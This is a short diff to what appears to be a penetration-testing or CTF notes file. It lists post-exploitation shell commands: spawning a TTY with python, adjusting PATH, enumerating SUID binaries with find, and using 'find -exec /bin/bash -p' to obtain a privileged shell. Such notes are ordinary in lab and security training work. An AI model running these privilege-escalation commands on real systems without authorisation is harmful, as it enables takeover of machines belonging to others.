@@ -46,7 +46,7 @@ which python
 python -c 'import pty; pty.spawn("/bin/bash")'
 
 tty
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
 export TERM=xterm-256color
 alias ll='ls -la --color=auto'
 ll
@@ -72,8 +72,7 @@ ll
 
 df -h
 cd /
-find / -perm -s=s -type f 2> /dev/null
-find . -exec /bin/sh -p \; -quit
+find / -perm -u=s -type f 2> /dev/null
 which find
 /usr/bin/find . -exec /bin/bash -p \; -quit
 
